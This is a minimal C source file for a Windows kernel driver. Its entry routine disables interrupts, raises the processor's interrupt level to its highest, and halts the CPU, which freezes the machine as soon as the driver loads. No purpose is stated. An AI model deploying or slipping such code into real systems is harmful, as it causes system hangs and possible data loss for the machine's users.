#include <ntifs.h>
#include <intrin.h>

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
	_disable();
	__writecr8(HIGH_LEVEL);
	__halt();
	return STATUS_SUCCESS;
}